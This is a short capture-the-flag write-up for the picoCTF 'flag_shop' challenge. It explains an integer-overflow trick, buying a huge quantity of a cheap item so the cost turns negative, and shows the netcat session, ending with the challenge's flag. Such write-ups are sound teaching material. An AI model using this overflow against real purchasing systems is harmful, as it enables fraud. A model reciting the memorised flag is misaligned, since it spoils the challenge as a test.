<img width="610" alt="flag_shop_Description" src="https://github.com/sahinyurek/picoCTF-writeups/assets/62119201/ecae723b-1c84-49ea-b421-bff5d504f932">

We don't have enough balance to buy the 1337 flag so we buy the not flag at a very high quantity so that it overflows the int and gives us money instead.

```shell
┌──(xodzk㉿kali)-[~]
└─$ nc jupiter.challenges.picoctf.org 9745
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
99999999999

The final cost is: -1039688580

Your current balance after transaction: 1039689680

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1039689680 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_65d67a74}

```
